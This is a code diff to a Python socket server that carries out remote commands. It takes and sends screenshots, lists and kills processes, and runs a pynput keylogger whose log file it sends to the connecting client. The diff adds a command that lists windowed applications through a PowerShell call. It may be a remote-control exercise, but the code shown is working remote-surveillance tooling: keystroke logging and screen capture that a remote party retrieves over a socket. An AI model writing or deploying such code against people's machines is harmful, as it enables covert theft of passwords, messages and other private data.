@@ -4,6 +4,7 @@ import threading
 import os
 import pyautogui
 import time
+import subprocess
 from pynput import keyboard
 
 # Commands
@@ -14,10 +15,12 @@ CMD_KILL_PROCESS = 'kill_process'
 CMD_START_KEYLOGGER = 'start_keylogger'
 CMD_STOP_KEYLOGGER = 'stop_keylogger'
 CMD_PRINT_KEYLOGGER = 'print_keylogger'
+CMD_VIEW_APPS = 'view_apps'
 
 # FLAGS
 FLAG_FILE_END = 'FILE_END'
 FLAG_PROCESSES_END = 'PROCESSES_END'
+FLAG_APPS_END = 'APPS_END'
 
 # BUFFER
 BUFFER_SIZE = 1024
@@ -51,34 +54,48 @@ class Server:
     while connected:
       data = conn.recv(BUFFER_SIZE)
 
+      # Shutdown
       if data == CMD_SHUTDOWN.encode():
         self.shutdown(conn, addr)
 
+      # Take screenshot
       elif data == CMD_TAKE_SCREENSHOT.encode():
         self.take_screenshot()
         self.send_file(os.path.join(TMP_PATH, 'screenshot.png'), conn)
 
+      # View processes
       elif data == CMD_VIEW_PROCESSES.encode():
         processes = self.get_all_processes()
         conn.send(processes.encode())
         time.sleep(0.01)
         conn.send(FLAG_PROCESSES_END.encode())
 
+      # Kill process
       elif data == CMD_KILL_PROCESS.encode():
         pid = conn.recv(BUFFER_SIZE).decode()
         self.kill_process(pid)
 
+      # Start keylogger
       elif data == CMD_START_KEYLOGGER.encode():
         print('Starting keylogger')
         self.start_keylogger()
 
+      # Stop keylogger
       elif data == CMD_STOP_KEYLOGGER.encode():
         print('Stopping keylogger')
         self.stop_keylogger()
       
+      # Print keylogger
       elif data == CMD_PRINT_KEYLOGGER.encode():
         print('Printing keylogger')
         self.send_file(os.path.join(TMP_PATH, 'keylog.txt'), conn)
+
+      # View apps
+      elif data == CMD_VIEW_APPS.encode():
+        apps = self.get_all_apps()
+        conn.send(apps.encode())
+        time.sleep(0.01)
+        conn.send(FLAG_APPS_END.encode())
 
     conn.close()
     print(f"[DISCONNECTED] {addr} disconnected.")
@@ -139,6 +156,19 @@ class Server:
    
   def stop_keylogger(self):
     self.keylogger_listener.stop()
+
+  def get_all_apps(self):
+    cmd = 'powershell "gps | where {$_.MainWindowTitle } | select ProcessName, Id'
+    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
+    apps = ""
+    for line in proc.stdout:
+      if line.rstrip():
+        # only print lines that are not empty
+        # decode() is necessary to get rid of the binary string (b')
+        # rstrip() to remove `\r\n`
+        apps += line.decode().rstrip()
+        apps += "\n"
+    return apps
 
 if __name__ == '__main__':
   server = Server()
